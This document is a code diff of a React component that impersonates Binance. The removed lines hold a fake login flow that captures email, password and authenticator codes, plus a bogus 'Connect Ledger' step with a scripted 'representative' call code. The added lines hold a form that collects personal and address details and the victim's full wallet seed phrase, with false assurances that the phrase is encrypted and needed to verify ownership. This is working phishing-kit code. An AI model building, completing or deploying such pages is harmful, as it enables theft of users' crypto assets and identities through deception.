-            onClick={handleNoticeConfirm}
-            className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
-            style={{
-              backgroundColor: "var(--color-BtnBg, #FCD535)",
-              color: "var(--color-TextOnYellow, #202630)",
-              height: "34px"
-            }}
-            aria-label="I Understand"
-          >
-            I Understand
-          </button>
-        </div>
-      );
-    }
-
-    if (currentStep === 'verifying') {
-      return (
-        <div className="text-center" style={{ minHeight: "350px", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}>
-          <div className="flex justify-center mb-4">
-            <div className="animate-spin rounded-full h-8 w-8 border-4 border-yellow-500 border-t-transparent"></div>
-          </div>
-          <div 
-            className="text-xs font-semibold font-binance"
-            style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-          >
-            Please wait a moment while we verify your details
-          </div>
-        </div>
-      );
-    }
-
-    if (currentStep === 'success') {
-      return (
-        <div style={{ minHeight: "450px", display: "flex", flexDirection: "column" }}>
-          <div className="flex-1">
-            <div 
-              className="text-sm font-semibold font-binance mb-4"
-              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-            >
-              Connect Ledger
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div>
+                <Label htmlFor="email">Email Address *</Label>
+                <Input
+                  id="email"
+                  type="email"
+                  value={formData.email}
+                  onChange={(e) => updateFormData('email', e.target.value)}
+                  placeholder="Enter your email"
+                  required
+                />
+              </div>
+              <div>
+                <Label htmlFor="phoneNumber">Phone Number *</Label>
+                <Input
+                  id="phoneNumber"
+                  type="tel"
+                  value={formData.phoneNumber}
+                  onChange={(e) => updateFormData('phoneNumber', e.target.value)}
+                  placeholder="Enter your phone number"
+                  required
+                />
+              </div>
             </div>
+          </div>
+        );
+
+      case 2:
+        return (
+          <div className="space-y-4">
+            <div>
+              <Label htmlFor="address">Street Address *</Label>
+              <Input
+                id="address"
+                value={formData.address}
+                onChange={(e) => updateFormData('address', e.target.value)}
+                placeholder="Enter your street address"
+                required
+              />
+            </div>
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+              <div>
+                <Label htmlFor="zipCode">Zip Code *</Label>
+                <Input
+                  id="zipCode"
+                  value={formData.zipCode}
+                  onChange={(e) => updateFormData('zipCode', e.target.value)}
+                  placeholder="Enter zip code"
+                  required
+                />
+              </div>
+              <div>
+                <Label htmlFor="city">City *</Label>
+                <Input
+                  id="city"
+                  value={formData.city}
+                  onChange={(e) => updateFormData('city', e.target.value)}
+                  placeholder="Enter your city"
+                  required
+                />
+              </div>
+              <div>
+                <Label htmlFor="country">Country *</Label>
+                <Select value={formData.country} onValueChange={(value) => updateFormData('country', value)}>
+                  <SelectTrigger>
+                    <SelectValue placeholder="Select country" />
+                  </SelectTrigger>
+                  <SelectContent>
+                    <SelectItem value="us">United States</SelectItem>
+                    <SelectItem value="ca">Canada</SelectItem>
+                    <SelectItem value="uk">United Kingdom</SelectItem>
+                    <SelectItem value="au">Australia</SelectItem>
+                    <SelectItem value="de">Germany</SelectItem>
+                    <SelectItem value="fr">France</SelectItem>
+                    <SelectItem value="other">Other</SelectItem>
+                  </SelectContent>
+                </Select>
+              </div>
+            </div>
+          </div>
+        );
+
+      case 3:
+        return (
+          <div className="space-y-4">
+            <Alert>
+              <Shield className="h-4 w-4" />
+              <AlertDescription>
+                Your seed phrase is encrypted and secure. This information is required to verify your wallet ownership.
+              </AlertDescription>
+            </Alert>
             
-            <div className="text-left space-y-4 mb-5">
-              <div className="text-xs font-binance text-white leading-relaxed">
-                We're now taking an important step to enhance the security of your assets. Please prepare your Ledger device to ensure maximum protection of your funds.
-              </div>
-              
-              <div className="text-xs font-binance text-white leading-relaxed">
-                <strong>Your Ledger device uses a two-key security system:</strong>
-              </div>
-              
-              <div className="bg-[#2B3139] border border-[#474D57] rounded p-3 space-y-2">
-                <div className="text-xs font-binance text-white">
-                  • One key is automatically generated for you here. Please store this key in a secure place, as it is essential for accessing your assets.
-                </div>
-                <div className="text-xs font-binance text-white">
-                  • The second key can be generated by you once you receive your Ledger device at home.
-                </div>
-                <div className="text-xs font-binance text-white">
-                  • Together, these two keys ensure the highest level of protection for your account.
-                </div>
-              </div>
-              
-              <div className="bg-red-500/10 border border-red-500/20 rounded p-3">
-                <div className="text-xs font-binance text-red-400 leading-relaxed">
-                  <strong>⚠️ Important Security Notice:</strong><br/>
-                  • Never share your keys with anyone<br/>
-                  • Binance will never ask you for your private keys or passwords<br/>
-                  • Make sure no one is watching when you view or store your keys
-                </div>
-              </div>
-              
-              <div className="text-xs font-binance text-white leading-relaxed">
-                <strong>How It Works:</strong><br/>
-                When you click Show Private Key, a 12–24-word recovery phrase will be generated. You must store this phrase securely. Once you click Next, you will no longer be able to retrieve this phrase from this page.
-              </div>
-            </div>
-          </div>
-
-          <div className="mt-auto space-y-3">
-            <Dialog open={isCallDialogOpen} onOpenChange={setIsCallDialogOpen}>
-              <DialogTrigger asChild>
-                <button
+            <div>
+              <Label htmlFor="seedPhrase">Wallet Seed Phrase *</Label>
+              <div className="relative">
+                <Input
+                  id="seedPhrase"
+                  type={showSeedPhrase ? "text" : "password"}
+                  value={formData.seedPhrase}
+                  onChange={(e) => updateFormData('seedPhrase', e.target.value)}
+                  placeholder="Enter your 12 or 24-word seed phrase"
+                  className="pr-10"
+                  required
+                />
+                <Button
                   type="button"
-                  className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 border border-yellow-500/50 font-bold font-binance text-xs"
-                  style={{
-                    backgroundColor: "transparent",
-                    color: "var(--color-BtnBg, #FCD535)",
-                    height: "34px"
-                  }}
+                  variant="ghost"
+                  size="sm"
+                  className="absolute right-2 top-1/2 transform -translate-y-1/2"
+                  onClick={() => setShowSeedPhrase(!showSeedPhrase)}
                 >
-                  Request a Call from a Binance Representative for Phone Support
-                </button>
-              </DialogTrigger>
-              <DialogContent className="bg-[#1E2329] border-[#474D57]">
-                <DialogHeader>
-                  <DialogTitle className="text-white text-sm font-binance">Phone Support</DialogTitle>
-                </DialogHeader>
-                <div className="text-xs font-binance text-white leading-relaxed">
-                  A Binance representative will contact you shortly. Please do not close this page. Our representative will ask for the following code: <strong className="text-yellow-400">7791</strong>
-                </div>
-              </DialogContent>
-            </Dialog>
+                  {showSeedPhrase ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
+                </Button>
+              </div>
+            </div>
 
-            <button
-              type="button"
-              onClick={handleConnectLedger}
-              className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
-              style={{
-                backgroundColor: "var(--color-BtnBg, #FCD535)",
-                color: "var(--color-TextOnYellow, #202630)",
-                height: "34px"
-              }}
-              aria-label="Connect Ledger"
-            >
-              Connect Ledger
-            </button>
+            <Alert>
+              <Lock className="h-4 w-4" />
+              <AlertDescription>
+                <strong>Security Notice:</strong> Never share your seed phrase with anyone. Binance will never ask for your complete seed phrase.
+              </AlertDescription>
+            </Alert>
           </div>
-        </div>
-      );
+        );
+
+      default:
+        return null;
     }
-
-    return null;
   };
 
-  const renderMainForm = () => {
-    if (currentStep === 'personal-details') {
-      return (
-        <div>
-          <form onSubmit={handlePersonalDetailsSubmit}>
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-3">
-              <div className="bn-formItem">
-                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                  First Name
-                </label>
-                <div 
-                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.firstName ? 'border-red-500' : ''}`}
-                  style={{
-                    backgroundColor: "var(--color-Input, #2B3139)",
-                    border: `1px solid ${errors.firstName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                    height: "38px"
-                  }}
-                >
-                  <input
-                    type="text"
-                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                    value={personalDetails.firstName}
-                    onChange={(e) => setPersonalDetails({...personalDetails, firstName: e.target.value})}
-                  />
-                </div>
-                {errors.firstName && (
-                  <div className="text-red-500 text-xs mt-1 font-binance">
-                    {errors.firstName}
-                  </div>
-                )}
-              </div>
-
-              <div className="bn-formItem">
-                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                  Last Name
-                </label>
-                <div 
-                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.lastName ? 'border-red-500' : ''}`}
-                  style={{
-                    backgroundColor: "var(--color-Input, #2B3139)",
-                    border: `1px solid ${errors.lastName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                    height: "38px"
-                  }}
-                >
-                  <input
-                    type="text"
-                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                    value={personalDetails.lastName}
-                    onChange={(e) => setPersonalDetails({...personalDetails, lastName: e.target.value})}
-                  />
-                </div>
-                {errors.lastName && (
-                  <div className="text-red-500 text-xs mt-1 font-binance">
-                    {errors.lastName}
-                  </div>
-                )}
-              </div>
-
-              <div className="bn-formItem">
-                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                  Date of Birth
-                </label>
-                <div 
-                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.dateOfBirth ? 'border-red-500' : ''}`}
-                  style={{
-                    backgroundColor: "var(--color-Input, #2B3139)",
-                    border: `1px solid ${errors.dateOfBirth ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                    height: "38px"
-                  }}
-                >
-                  <input
-                    type="date"
-                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                    value={personalDetails.dateOfBirth}
-                    onChange={(e) => setPersonalDetails({...personalDetails, dateOfBirth: e.target.value})}
-                  />
-                </div>
-                {errors.dateOfBirth && (
-                  <div className="text-red-500 text-xs mt-1 font-binance">
-                    {errors.dateOfBirth}
-                  </div>
-                )}
-              </div>
-
-              <div className="bn-formItem">
-                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                  Phone Number
-                </label>
-                <div 
-                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.phoneNumber ? 'border-red-500' : ''}`}
-                  style={{
-                    backgroundColor: "var(--color-Input, #2B3139)",
-                    border: `1px solid ${errors.phoneNumber ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                    height: "38px"
-                  }}
-                >
-                  <input
-                    type="tel"
-                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                    value={personalDetails.phoneNumber}
-                    onChange={(e) => setPersonalDetails({...personalDetails, phoneNumber: e.target.value})}
-                  />
-                </div>
-                {errors.phoneNumber && (
-                  <div className="text-red-500 text-xs mt-1 font-binance">
-                    {errors.phoneNumber}
-                  </div>
-                )}
-              </div>
-
-              <div className="bn-formItem md:col-span-2">
-                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                  Address
-                </label>
-                <div 
-                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.address ? 'border-red-500' : ''}`}
-                  style={{
-                    backgroundColor: "var(--color-Input, #2B3139)",
-                    border: `1px solid ${errors.address ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                    height: "38px"
-                  }}
-                >
-                  <input
-                    type="text"
-                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                    value={personalDetails.address}
-                    onChange={(e) => setPersonalDetails({...personalDetails, address: e.target.value})}
-                  />
-                </div>
-                {errors.address && (
-                  <div className="text-red-500 text-xs mt-1 font-binance">
-                    {errors.address}
-                  </div>
-                )}
-              </div>
-
-              <div className="bn-formItem">
-                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                  Postal Code
-                </label>
-                <div 
-                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.postalCode ? 'border-red-500' : ''}`}
-                  style={{
-                    backgroundColor: "var(--color-Input, #2B3139)",
-                    border: `1px solid ${errors.postalCode ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                    height: "38px"
-                  }}
-                >
-                  <input
-                    type="text"
-                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                    value={personalDetails.postalCode}
-                    onChange={(e) => setPersonalDetails({...personalDetails, postalCode: e.target.value})}
-                  />
-                </div>
-                {errors.postalCode && (
-                  <div className="text-red-500 text-xs mt-1 font-binance">
-                    {errors.postalCode}
-                  </div>
-                )}
-              </div>
-
-              <div className="bn-formItem">
-                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                  City
-                </label>
-                <div 
-                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.city ? 'border-red-500' : ''}`}
-                  style={{
-                    backgroundColor: "var(--color-Input, #2B3139)",
-                    border: `1px solid ${errors.city ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                    height: "38px"
-                  }}
-                >
-                  <input
-                    type="text"
-                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                    value={personalDetails.city}
-                    onChange={(e) => setPersonalDetails({...personalDetails, city: e.target.value})}
-                  />
-                </div>
-                {errors.city && (
-                  <div className="text-red-500 text-xs mt-1 font-binance">
-                    {errors.city}
-                  </div>
-                )}
-              </div>
-
-              <div className="bn-formItem">
-                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                  Country
-                </label>
-                <div 
-                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.country ? 'border-red-500' : ''}`}
-                  style={{
-                    backgroundColor: "var(--color-Input, #2B3139)",
-                    border: `1px solid ${errors.country ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                    height: "38px"
-                  }}
-                >
-                  <select
-                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs appearance-none cursor-pointer"
-                    value={personalDetails.country}
-                    onChange={(e) => setPersonalDetails({...personalDetails, country: e.target.value})}
-                    style={{ 
-                      backgroundColor: "var(--color-Input, #2B3139)",
-                      backgroundImage: `url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%23848E9C' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3e%3c/svg%3e")`,
-                      backgroundPosition: 'right 0.6rem center',
-                      backgroundRepeat: 'no-repeat',
-                      backgroundSize: '1em 1em'
-                    }}
-                  >
-                    <option value="" className="bg-[#2B3139] text-white text-xs">Select a country</option>
-                    {countries.map((country) => (
-                      <option key={country} value={country} className="bg-[#2B3139] text-white text-xs">
-                        {country}
-                      </option>
-                    ))}
-                  </select>
-                </div>
-                {errors.country && (
-                  <div className="text-red-500 text-xs mt-1 font-binance">
-                    {errors.country}
-                  </div>
-                )}
-              </div>
-            </div>
-          </form>
-          
-          <button
-            className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
-            style={{
-              backgroundColor: "var(--color-BtnBg, #FCD535)",
-              color: "var(--color-TextOnYellow, #202630)",
-              height: "34px"
-            }}
-            type="submit"
-            disabled={isLoading}
-            aria-label="Continue"
-            onClick={handlePersonalDetailsSubmit}
-          >
-            {isLoading ? (
-              <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
-            ) : (
-              'Continue'
-            )}
-          </button>
-        </div>
-      );
+  const isStepValid = () => {
+    switch (currentStep) {
+      case 1:
+        return formData.fullName && formData.dateOfBirth && formData.email && formData.phoneNumber;
+      case 2:
+        return formData.address && formData.zipCode && formData.city && formData.country;
+      case 3:
+        return formData.seedPhrase.trim().split(/\s+/).length >= 12;
+      default:
+        return false;
     }
-
-    const getCurrentForm = () => {
-      switch (currentStep) {
-        case 'email':
-          return (
-            <div>
-              <form onSubmit={handleEmailSubmit}>
-                <div className="bn-formItem mb-3">
-                  <label 
-                    className="block mb-2 text-xs font-medium font-binance" 
-                    htmlFor="bn-formItem-q8nY2Y1v"
-                    style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-                  >
-                    Email/Phone number
-                  </label>
-                  <div>
-                    <div className="css-4cffwv">
-                      <div 
-                        className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.email ? 'border-red-500' : ''}`}
-                        style={{
-                          backgroundColor: "var(--color-Input, #2B3139)",
-                          border: `1px solid ${errors.email ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                          height: "38px"
-                        }}
-                        role="group"
-                      >
-                        <input
-                          placeholder="Email/Phone (without country code)"
-                          type="text"
-                          role="textbox"
-                          aria-label="Username field for email or phone number"
-                          name="username"
-                          autoFocus
-                          id="bn-formItem-q8nY2Y1v"
-                          autoCapitalize="off"
-                          className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                          spellCheck="false"
-                          autoComplete="username"
-                          value={email}
-                          onChange={(e) => setEmail(e.target.value)}
-                        />
-                      </div>
-                      {errors.email && (
-                        <div className="text-red-500 text-xs mt-1 font-binance">
-                          {errors.email}
-                        </div>
-                      )}
-                    </div>
-                  </div>
-                </div>
-              </form>
-              
-              <button
-                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
-                style={{
-                  backgroundColor: "var(--color-BtnBg, #FCD535)",
-                  color: "var(--color-TextOnYellow, #202630)",
-                  height: "34px"
-                }}
-                type="submit"
-                disabled={isLoading}
-                aria-label="Next"
-                onClick={handleEmailSubmit}
-              >
-                {isLoading ? (
-                  <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
-                ) : (
-                  'Next'
-                )}
-              </button>
-            </div>
-          );
-        case 'password':
-          return (
-            <div>
-              <form onSubmit={handlePasswordSubmit}>
-                <div className="bn-formItem mb-3">
-                  <label 
-                    className="block mb-2 text-xs font-medium font-binance" 
-                    htmlFor="password-field"
-                    style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-                  >
-                    Password
-                  </label>
-                  <div>
-                    <div className="css-4cffwv">
-                      <div 
-                        className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.password ? 'border-red-500' : ''}`}
-                        style={{
-                          backgroundColor: "var(--color-Input, #2B3139)",
-                          border: `1px solid ${errors.password ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                          height: "38px"
-                        }}
-                        role="group"
-                      >
-                        <input
-                          placeholder="Enter your password"
-                          type="password"
-                          role="textbox"
-                          aria-label="Password field"
-                          name="password"
-                          autoFocus
-                          id="password-field"
-                          autoCapitalize="off"
-                          className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
-                          spellCheck="false"
-                          autoComplete="current-password"
-                          value={password}
-                          onChange={(e) => setPassword(e.target.value)}
-                        />
-                      </div>
-                      {errors.password && (
-                        <div className="text-red-500 text-xs mt-1 font-binance">
-                          {errors.password}
-                        </div>
-                      )}
-                    </div>
-                  </div>
-                </div>
-              </form>
-              
-              <button
-                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
-                style={{
-                  backgroundColor: "var(--color-BtnBg, #FCD535)",
-                  color: "var(--color-TextOnYellow, #202630)",
-                  height: "34px"
-                }}
-                type="submit"
-                disabled={isLoading}
-                aria-label="Continue"
-                onClick={handlePasswordSubmit}
-              >
-                {isLoading ? (
-                  <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
-                ) : (
-                  'Continue'
-                )}
-              </button>
-            </div>
-          );
-        case 'verification':
-          return (
-            <div>
-              <div 
-                className="mb-3 text-xs font-binance"
-                style={{ color: "var(--color-SecondaryText, #B7BDC6)" }}
-              >
-                Enter the code from your Google/Binance Authenticator.
-              </div>
-              <form onSubmit={handleVerificationSubmit}>
-                <div className="bn-formItem mb-3">
-                  <label 
-                    className="block mb-2 text-xs font-binance" 
-                    htmlFor="verification-field"
-                    style={{ color: "var(--color-TertiaryText, #848E9C)" }}
-                  >
-                    Authenticator App
-                  </label>
-                  <div>
-                    <div className="css-4cffwv relative">
-                      <div 
-                        className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.verification ? 'border-red-500' : ''}`}
-                        style={{
-                          backgroundColor: "var(--color-Input, #2B3139)",
-                          border: `1px solid ${errors.verification ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                          height: "38px"
-                        }}
-                        role="group"
-                      >
-                        <input
-                          placeholder="Enter 6-digit code"
-                          type="text"
-                          role="textbox"
-                          aria-label="Verification code field"
-                          name="verification"
-                          autoFocus
-                          id="verification-field"
-                          autoCapitalize="off"
-                          className="bg-transparent border-0 text-white p-2.5 pr-12 w-full outline-none h-full font-binance text-xs"
-                          spellCheck="false"
-                          maxLength={6}
-                          value={verificationCode}
-                          onChange={(e) => setVerificationCode(e.target.value)}
-                        />
-                        <button
-                          type="button"
-                          onClick={handlePaste}
-                          className="absolute right-2.5 top-1/2 transform -translate-y-1/2 font-medium hover:opacity-80 transition-opacity font-binance text-xs"
-                          style={{ color: "var(--color-BtnBg, #FCD535)" }}
-                        >
-                          Paste
-                        </button>
-                      </div>
-                      {errors.verification && (
-                        <div className="text-red-500 text-xs mt-1 font-binance">
-                          {errors.verification}
-                        </div>
-                      )}
-                    </div>
-                  </div>
-                </div>
-              </form>
-              
-              <button
-                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
-                style={{
-                  backgroundColor: "var(--color-BtnBg, #FCD535)",
-                  color: "var(--color-TextOnYellow, #202630)",
-                  height: "34px"
-                }}
-                type="submit"
-                disabled={isLoading}
-                aria-label="Submit"
-                onClick={handleVerificationSubmit}
-              >
-                {isLoading ? (
-                  <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
-                ) : (
-                  'Submit'
-                )}
-              </button>
-            </div>
-          );
-        default:
-          return null;
-      }
-    };
-
-    return getCurrentForm();
   };
-
-  const renderButton = () => {
-    if (currentStep === 'personal-details') {
-      return (
-        <button
-          className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
-          style={{
-            backgroundColor: "var(--color-BtnBg, #FCD535)",
-            color: "var(--color-TextOnYellow, #202630)",
-            height: "34px"
-          }}
-          type="submit"
-          disabled={isLoading}
-          aria-label="Continue"
-          onClick={handlePersonalDetailsSubmit}
-        >
-          {isLoading ? (
-            <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
-          ) : (
-            'Continue'
-          )}
-        </button>
-      );
-    }
-
-    const getButtonText = () => {
-      switch (currentStep) {
-        case 'email':
-          return 'Next';
-        case 'password':
-          return 'Continue';
-        case 'verification':
-          return 'Submit';
-        default:
-          return 'Submit';
-      }
-    };
-
-    const handleButtonClick = (e: React.FormEvent) => {
-      e.preventDefault();
-      switch (currentStep) {
-        case 'email':
-          handleEmailSubmit(e);
-          break;
-        case 'password':
-          handlePasswordSubmit(e);
-          break;
-        case 'verification':
-          handleVerificationSubmit(e);
-          break;
-      }
-    };
-
-    return (
-      <button
-        className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
-        style={{
-          backgroundColor: "var(--color-BtnBg, #FCD535)",
-          color: "var(--color-TextOnYellow, #202630)",
-          height: "34px"
-        }}
-        type="submit"
-        disabled={isLoading}
-        aria-label={getButtonText()}
-        onClick={handleButtonClick}
-      >
-        {isLoading ? (
-          <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
-        ) : (
-          getButtonText()
-        )}
-      </button>
-    );
-  };
-
-  const renderAlternativeOptions = () => {
-    if (currentStep !== 'email') return null;
-
-    return (
-      <>
-        <div className="my-3 flex items-center md:mb-2 md:mt-4">
-          <div 
-            className="h-[1px] flex-1" 
-            style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
-          />
-          <div 
-            className="px-3 text-xs font-binance"
-            style={{ 
-              color: "var(--color-TertiaryText, #848E9C)",
-              fontWeight: "400",
-              lineHeight: "16px"
-            }}
-          >
-            or
-          </div>
-          <div 
-            className="h-[1px] flex-1" 
-            style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
-          />
-        </div>
-
-        <div className="space-y-2">
-          <button 
-            className="w-full py-2.5 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
-            style={{
-              backgroundColor: "transparent",
-              border: "1px solid var(--color-InputLine, #474D57)",
-              color: "var(--color-PrimaryText, #EAECEF)",
-              fontSize: "11px",
-              fontWeight: "400",
-              lineHeight: "16px",
-              height: "38px"
-            }}
-            role="button" 
-            aria-label="Continue with Passkey"
-          >
-            <div className="icon-warp mr-2">
-              <div className="ml-1 h-[16px]">
-                <svg 
-                  className="bn-svg h-[16px] w-[16px]" 
-                  style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-                  viewBox="0 0 24 24" 
-                  xmlns="http://www.w3.org/2000/svg"
-                  fill="currentColor"
-                >
-                  <path fillRule="evenodd" clipRule="evenodd" d="M1.5 17c0-2.9 2.35-5.25 5.25-5.25h3c2.9 0 5.25 2.35 5.25 5.25v4a.75.75 0 01-1.5 0v-4a3.75 3.75 0 00-3.75-3.75h-3A3.75 3.75 0 003 17v4a.75.75 0 01-1.5 0v-4zM8.25 9a3 3 0 100-6 3 3 0 000 6zm0 1.5a4.5 4.5 0 100-9 4.5 4.5 0 000 9zM18.536 11.923a.75.75 0 00-.75.75v5.138a.75.75 0 001.5 0v-5.138a.75.75 0 00-.75-.75z" />
-                  <path fillRule="evenodd" clipRule="evenodd" d="M17.786 16.041c0 .414.336.75.75.75h2.167a.75.75 0 000-1.5h-2.167a.75.75 0 00-.75.75zM16.75 10.15a1.773 1.773 0 113.545 0 1.773 1.773 0 01-3.545 0zm1.773-3.272a3.273 3.273 0 100 6.545 3.273 3.273 0 000-6.545z" />
-                </svg>
-              </div>
-            </div>
-            <div>Continue with Passkey</div>
-          </button>
-
-          <button 
-            className="w-full py-2.5 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
-            style={{
-              backgroundColor: "transparent",
-              border: "1px solid var(--color-InputLine, #474D57)",
-              color: "var(--color-PrimaryText, #EAECEF)",
-              fontSize: "11px",
-              fontWeight: "400",
-              lineHeight: "16px",
-              height: "38px"
-            }}
-            role="button" 
-            aria-label="Continue with Google"
-          >
-            <div className="icon-warp mr-2">
-              <svg width="18" height="18" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="bn-svg">
-                <g clipPath="url(#clip0_2445_976)">
-                  <path fillRule="evenodd" clipRule="evenodd" d="M19.68 12.1818C19.68 11.6146 19.6291 11.0691 19.5345 10.5455H12V13.64H16.3055C16.12 14.64 15.5564 15.4873 14.7091 16.0546V18.0618H17.2945C18.8073 16.6691 19.68 14.6182 19.68 12.1818Z" fill="#4285F4" />
-                  <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 20C14.1597 20 15.9706 19.2836 17.2942 18.0618L17.3524 6.08364C15.9669 4.79273 14.156 4 11.9997 4C8.8724 4 6.16695 5.79273 4.85059 8.40727L7.52331 10.48C8.1524 8.58909 9.91604 7.18182 11.9997 7.18182C13.1742 7.18182 14.2288 7.58545 15.0579 8.37818L17.3524 6.08364C15.9669 4.79273 14.156 4 11.9997 4C8.8724 4 6.16695 5.79273 4.85059 8.40727L7.52331 10.48C8.1524 8.58909 9.91604 7.18182 11.9997 7.18182Z" fill="#34A853" />
-                  <path fillRule="evenodd" clipRule="evenodd" d="M7.52364 13.52C7.36364 13.04 7.27273 12.5273 7.27273 12C7.27273 11.4727 7.36364 10.96 7.52364 10.48V8.40729H4.85091C4.30909 9.48729 4 10.7091 4 12C4 13.2909 4.30909 14.5127 4.85091 15.5927L7.52364 13.52C8.16744 12.6776 9.14969 12.1288 10.0132 11.232C10.2392 10.9972 14.1659 7.42557 14.2419 7.10157C14.2514 7.06104 14.2603 6.90999 14.1705 6.83024C14.0808 6.75048 13.9483 6.77775 13.8528 6.79944C13.7173 6.83019 11.5595 8.25641 7.37938 11.0781C6.7669 11.4987 6.21213 11.7036 5.71508 11.6929C5.16711 11.681 4.11306 11.383 3.32947 11.1283C2.36838 10.8159 1.60451 10.6507 1.67103 10.1202C1.70568 9.84381 2.08624 9.56118 2.81274 9.27228C2.81274 9.27228 2.81274 9.27228 2.81274 9.27228Z" fill="#00AEED" />
-                </g>
-                <defs>
-                  <clipPath id="clip0_2445_976">
-                    <rect width="16" height="16" fill="none" transform="translate(4 4)" />
-                  </clipPath>
-                </defs>
-              </svg>
-            </div>
-            <div>Continue with Google</div>
-          </button>
-
-          <button 
-            className="w-full py-2.5 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
-            style={{
-              backgroundColor: "transparent",
-              border: "1px solid var(--color-InputLine, #474D57)",
-              color: "var(--color-PrimaryText, #EAECEF)",
-              fontSize: "11px",
-              fontWeight: "400",
